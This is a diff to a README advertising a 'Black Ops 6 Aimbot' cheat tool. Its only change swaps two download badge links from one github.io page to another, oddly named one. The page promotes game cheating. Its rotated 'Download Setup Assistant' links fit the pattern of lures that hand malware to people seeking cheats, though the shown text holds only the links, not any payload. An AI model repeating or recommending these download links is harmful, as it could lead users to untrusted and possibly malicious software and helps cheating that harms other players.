@@ -1,7 +1,7 @@
 # 🎯 Black Ops 6 Aimbot — Visual Aim Assistant & Overlay Tool
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-red?style=for-the-badge)](https://black-ops-6-aimbot-soft.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-black?style=for-the-badge&logo=call-of-duty)](https://black-ops-6-aimbot-soft.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-red?style=for-the-badge)](https://entertamintmomentprog.github.io/.github/)  
+[![Download Now](https://img.shields.io/badge/Download_Now-black?style=for-the-badge&logo=call-of-duty)](https://entertamintmomentprog.github.io/.github/)
 
 ---
 
